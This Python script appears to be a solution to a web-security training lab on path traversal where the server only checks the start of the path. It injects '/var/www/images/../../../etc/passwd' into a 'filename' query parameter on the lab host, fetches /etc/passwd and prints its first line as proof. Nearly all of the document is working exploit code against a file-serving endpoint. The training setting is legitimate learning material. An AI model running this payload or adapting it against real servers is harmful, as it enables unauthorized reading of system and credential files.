#############################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 11/10/2023
#
# Lab: File path traversal, validation of start of path
#
# Steps: 1. Inject payload into 'filename' query parameter to retrieve
#           the content of /etc/passwd
#        2. Extract the first line as a proof
#
#############################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0af700c204ec179f88f351f4009a00d2.web-security-academy.net" 

print(Fore.BLUE + "⟪#⟫ Injection parameter: " + Fore.YELLOW + "filename")

# the payload to retrieve the content of /etc/passwd
payload = "/var/www/images/../../../etc/passwd"

try:
    # fetch the page with the injected payload
    injection = requests.get(f"{url}/image?filename={payload}")
    
except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "⦗1⦘ Injecting payload to retrieve the content of /etc/passwd.. " +  Fore.GREEN + "OK")

# extract the first line of /etc/passwd
first_line = re.findall("(.*)\n", injection.text)[0]

print(Fore.WHITE + "⦗2⦘ Extracting the first line as a proof.. " +  Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + first_line)
print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

